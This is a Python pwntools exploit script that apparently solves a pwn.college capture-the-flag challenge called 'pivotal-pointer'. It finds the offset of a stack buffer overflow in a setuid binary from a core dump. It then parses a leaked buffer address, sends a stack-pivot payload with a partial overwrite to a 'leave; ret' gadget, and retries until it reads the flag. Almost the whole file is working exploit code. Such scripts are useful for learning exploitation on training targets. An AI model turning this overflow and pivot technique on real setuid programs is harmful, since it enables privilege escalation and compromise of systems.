import re
import sys
import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])

def tee[T: pwn.tube](process: T) -> T:
    import sys

    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def find_offset():
    import shutil

    bin = find_challenge()
    tmp = f"/tmp/{bin.removeprefix('/challenge/')}"
    shutil.copy2(bin, tmp)
    io = pwn.process(tmp, level="error")
    io.sendline(pwn.cyclic(256))
    io.wait()
    core = io.corefile
    fault_val = core.read(core.rsp, 4)
    offset = pwn.cyclic_find(fault_val)
    return offset


def ctf():
    # pivotal-pointer
    bin = find_challenge()
    elf = pwn.ELF(bin, checksec=False)

    rop = pwn.ROP(elf)
    ins = rop.find_gadget(["leave", "ret"]).address

    offset = find_offset()

    for _ in range(0x10):
        io: pwn.process
        if "gdb" in sys.argv:
            io = pwn.gdb.debug(
                bin,
                gdbscript="""
                source /opt/gef/gef.py
                """,
            )
        else:
            io = pwn.process(bin)
        tee(io)

        io.recvuntil(b"[LEAK] Your input buffer is located at: ")
        if not (m := re.match(rb"(0x[0-9a-fA-F]+)\.", io.recvline())):
            raise ValueError("failed to parse input buffer address")
        buff_ptr = int(m.group(1), 16)

        payload = pwn.flat(
            {
                offset - 0x8: buff_ptr - 0x10,
                offset + 0x0: (ins & 0xFFFF).to_bytes(2, "little"),
            }
        )
        io.send(payload)

        if b"pwn.college{" in io.recvrepeat():
            pwn.success("Found the flag!")
            exit(0)


if __name__ == "__main__":
    ctf()
